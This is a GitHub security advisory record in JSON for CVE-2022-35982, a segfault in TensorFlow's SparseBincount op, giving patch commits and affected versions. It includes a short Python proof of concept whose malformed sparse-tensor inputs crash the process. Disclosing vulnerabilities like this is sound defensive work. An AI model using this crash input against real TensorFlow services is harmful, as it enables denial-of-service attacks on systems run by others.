{
    "ghsaId": "GHSA-397c-5g2j-qxpv",
    "severity": "MODERATE",
    "summary": "TensorFlow vulnerable to segfault in `SparseBincount`",
    "description": "### Impact\nIf `SparseBincount` is given inputs for `indices`, `values`, and `dense_shape` that do not make a valid sparse tensor, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nbinary_output = True\nindices = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int64, seed=-1288)\nvalues = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-9366)\ndense_shape = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-9878)\nsize = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nweights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)\ntf.raw_ops.SparseBincount(indices=indices, values=values, dense_shape=dense_shape, size=size, weights=weights, binary_output=binary_output)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [40adbe4dd15b582b0210dfbf40c243a62f5119fa](https://github.com/tensorflow/tensorflow/commit/40adbe4dd15b582b0210dfbf40c243a62f5119fa).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n",
    "permalink": "https://github.com/advisories/GHSA-397c-5g2j-qxpv",
    "publishedAt": "2022-09-16T22:27:28Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-397c-5g2j-qxpv"
        },
        {
            "type": "CVE",
            "value": "CVE-2022-35982"
        }
    ]
}